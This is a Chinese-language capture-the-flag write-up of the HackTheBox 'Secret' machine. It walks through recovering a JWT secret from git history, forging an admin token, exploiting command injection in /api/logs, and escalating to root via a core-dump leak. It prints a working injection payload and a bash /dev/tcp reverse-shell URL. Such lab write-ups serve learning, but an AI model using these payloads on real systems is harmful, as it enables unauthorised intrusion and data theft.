---
title: HackTheBox-Secret
typora-root-url: ..
date: 2021-12-26 18:41:43
tags: HTB
---

## 简介

Hostname:secret.htb

IP:10.10.11.120

Os:linux

## 信息收集

```
nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.120
```

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-methods: No Allow or Public header in OPTIONS response (status code 404)
|_http-title: DUMB Docs
3000/tcp  open     http    Node.js (Express middleware)
|_http-methods: No Allow or Public header in OPTIONS response (status code 404)
|_http-title: DUMB Docs
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

目录扫描，未发现比较有用的

![image-20211226235709626](/assets/image-20211226235709626.png)

浏览发现可以下载项目源码

http://10.10.11.120/download/files.zip

## 攻击阶段

### 源码审计

对源码进行审计，发现 theadmin 账号可以调用 存在 任意命令执行的漏洞函数.

![image-20211227012159657](/assets/image-20211227012159657.png)

因此 问题变成了如何获取 theadmin 的权限，此处考虑 jwt伪造。此处我们需要寻找 token值

### git泄露

浏览文件，发现是一个git项目，使用git log 查看，发现一行注释

![image-20211227005715008](/assets/image-20211227005715008.png)

直接在github上搜索该commit hash，找到源码

![image-20211227010038085](/assets/image-20211227010038085.png)

![image-20211227010720056](/assets/image-20211227010720056.png)

或者使用git 命令直接回到 之前版本

```
git reset --hard 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

![image-20211227010822443](/assets/image-20211227010822443.png)

或者使用git 恢复 工具也可

### 伪造token

方法一：自己使用node 执行

```
const jwt = require("jsonwebtoken");

s = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"

const token = jwt.sign({ _id: 123, name: "theadmin" , email: "test@test.com"}, s)
console.log(token)
```

![image-20211227011107024](/assets/image-20211227011107024.png)

方法二：使用在线网站 解密测试

https://jwt.io/

![image-20211227011908770](/assets/image-20211227011908770.png)

随后利用 接口 /api/logs 执行命令测试

![image-20211227012745476](/assets/image-20211227012745476.png)

读取user flag

```
http://10.10.11.120/api/logs?file=abcdef|cat ..\/user.txt
```

## 提权

通过上一步，直接反弹shell

```
http://10.10.11.120/api/logs?file=abcdef|bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.52/5555%20%3C%261'
```

模拟tty

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

使用 LinEnum.sh 脚本枚举信息后，发现 /opt/count 文件较为可疑

后文为观看writeup后理解 

/opt/code.c 为 count 文件的源码，该文件可以root权限读取文件到内存，但正常情况我们无法看见。

但是代码中设置了 `prctl(PR_SET_DUMPABLE, 1);`，导致进程在崩溃时，会将内存dump出来(也就可以包含 /root/root.txt)

此处，我们需要准备两个shell，1个执行count 

![image-20211227020705501](/assets/image-20211227020705501.png)

另一个kill count进程

![image-20211227020730465](/assets/image-20211227020730465.png)

查看 `/var/crash`文件夹，可以看到dump出来的内存信息

![image-20211227020849643](/assets/image-20211227020849643.png)

解出crash 文件

```
apport-unpack _opt_count.1000.crash /tmp/test2
```

![image-20211227021132360](/assets/image-20211227021132360.png)

使用 strings 命令查看 CoreDump 文件，即可找到 root.txt 内容

![image-20211227021225849](/assets/image-20211227021225849.png)
